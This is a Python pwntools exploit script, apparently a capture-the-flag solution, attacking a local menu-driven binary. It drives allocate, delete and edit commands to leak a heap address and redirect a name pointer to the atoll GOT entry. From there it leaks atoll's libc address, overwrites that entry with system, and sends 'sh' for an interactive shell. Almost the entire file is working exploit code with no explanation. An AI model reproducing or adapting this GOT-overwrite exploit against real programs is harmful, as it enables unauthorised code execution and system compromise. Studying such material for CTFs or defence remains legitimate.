#!/usr/bin/env python2
# -*- coding: latin-1 -*-
import binascii
from pwn import *
context.binary = './prog.bin'

sh = ELF(which("sh"))
libc = [key for key in sh.libs.keys() if 'libc' in key][0]
libc = ELF(libc)

def bhex(digit):
    digit = hex(digit)[2:]
    if(len(digit) & 1): #bitwise is odd
        digit = "0"+digit
    return binascii.unhexlify(digit)

id = 1
name = 2
payload = ""
def new(name,id):
    string = ""
    string += "1\n"
    string += str(name)+"\n"
    string += id+"\n"
    return string
def dele(id,which):
    string = ""
    string += "3\n"
    string += str(id)+"\n"
    string += str(which)+"\n"
    return string
def edit(id,which,what):
    string = ""
    which = (4,5)[which == 1]
    string += str(which)+"\n"
    string += str(id)+"\n"
    string += str(what)+"\n"
    return string
aff= "2\n"

nom=""
idd=""

r = 4
for i in range(r):
    payload += new(nom,idd)
    payload += dele(i,name)
    payload += dele(i,id)
for i in range(r):
    payload += dele(i,nom)

payload += aff
p=process("./prog.bin")
p.send(payload)

leak = p.recvlines(148)[147][24:]
leak = binascii.hexlify(leak[::-1])
leak = int(leak,16)
orig = 0x604840

id0pos = leak-0xb8
atoll = 0x602048


sid0pos = bhex(id0pos)[::-1]
satoll = bhex(atoll)[::-1]

payload = edit(2,name,sid0pos) # Name can only write 7 bit, overwrite name3 pointer to id0 (can w 50B)
payload += edit(3,name,satoll) # Chose where id0 write

payload += aff

print "id0pos: "+hex(id0pos)
print "leaked adress: "+hex(leak)

p.send(payload)
atolladdr = p.recvlines(33)[32][23:]
atolladdr = binascii.hexlify(atolladdr[::-1])
atolladdr = int(atolladdr,16)

system = libc.symbols.system - libc.symbols.atoll #must be &system - &atoll from gdb

system = system+atolladdr
ssystem = bhex(system)[::-1]

print("atoll : "+hex(atolladdr))
print("system : "+hex(system))

payload = edit(0,id,ssystem)
payload += "sh\n"
p.send(payload)

p.interactive()
# print payload
